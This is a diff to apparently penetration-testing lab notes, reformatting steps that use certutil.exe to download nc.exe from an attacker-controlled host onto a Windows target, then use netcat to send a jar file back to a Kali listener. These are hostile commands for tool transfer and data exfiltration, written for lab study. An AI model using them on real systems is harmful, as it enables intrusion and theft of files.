@@ -133,10 +133,10 @@ dir /Q /A
 - Set up Python server
 
 - Copy nc.exe over to the target:
-```bash
-certutil.exe -urlcache -f <http://10.10.14.38:8082/nc.exe> c:\Users\svc_minecraft\Documents\nc.exe
 
-```
+`certutil.exe -urlcache -f http://10.10.14.38:8082/nc.exe c:\Users\svc_minecraft\Documents\nc.exe`
+
+
 - Using nc we can send and receive:
   - On Kali:
 ```bash
@@ -145,7 +145,7 @@ nc -lnvp 4444 \> playercounter-1.0-SNAPSHOT.jar
 ```
 - On Windows:
 ```bash
-c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 \< playercounter-1.0-SNAPSHOT.jar
+c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 < playercounter-1.0-SNAPSHOT.jar
 
 ```
 - **Ctrl+C on Kali** to stop the connection
